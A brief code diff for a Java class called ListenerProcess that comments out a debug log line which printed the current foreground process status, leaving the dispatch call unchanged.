@@ -179,7 +179,7 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 
 			String foreground = Status.self().getForeground();
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (run) " + foreground);
+				//Check.log(TAG + " (run) " + foreground);
 			}
 			dispatch(foreground);
 		}
